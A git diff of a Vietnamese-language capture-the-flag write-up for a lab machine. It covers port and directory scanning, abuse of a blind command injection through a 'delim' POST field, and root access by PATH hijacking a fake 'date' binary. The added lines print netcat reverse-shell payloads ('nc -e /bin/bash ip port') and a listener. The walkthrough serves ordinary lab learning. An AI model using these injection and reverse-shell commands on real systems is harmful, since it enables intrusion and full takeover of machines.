@@ -6,7 +6,7 @@ sai nmap de scan port nao dang mo tren server
 
 2 port dang mo la 22 (ssh) va 80(http) webserver dang su dung la apache
 
-sai gobuter de brute thu muc 
+sai gobuster de brute thu muc
 
 
 ``` gobuster dir -u http://10.10.11.104/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x "php" ```
@@ -33,17 +33,20 @@ sai gobuter de brute thu muc
 
 # EXPLOIT
 
-su dung curl de tao acc 
+su dung curl de tao acc tai page accounts.php
 
 ``` curl -XPOST http://10.10.11.104/accounts.php -d "username=d47&password=d47&confirm=d47" ```
 
-login vao
+login vao ta thay
 
 co file backup.zip => download => doc source => file logs.php co loi blind command injection
 
 ``` $output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}"); ```
 
 tao mot reverse shell 
+
+``` payload: delim=comma;nc -e /bin/bash ip port; ```
+``` local: nc -nlvp port ```
 
 nhung ko co quyen de doc file user.txt, nen can phai dang nhap vao voi quyen m4lwhere 
 
@@ -75,7 +78,7 @@ ta thay trong file script no dang su dung lenh la gzip, date => co the chon 1 tr
 
 ta su dung date de tao reverse shell de chiem quyen root
 ```
-  b1: cd /tmp => echo "nc -e /bin/bash if port" > date
+  b1: cd /tmp => echo "nc -e /bin/bash ip port" > date
   b2: cap quyen thuc thi cho file: chmod +x date
   b3: dua path cua file date vao $PATH : export PATH:/tmp:$PATH
   b4: sudo file_script => chiem duoc quyen root 
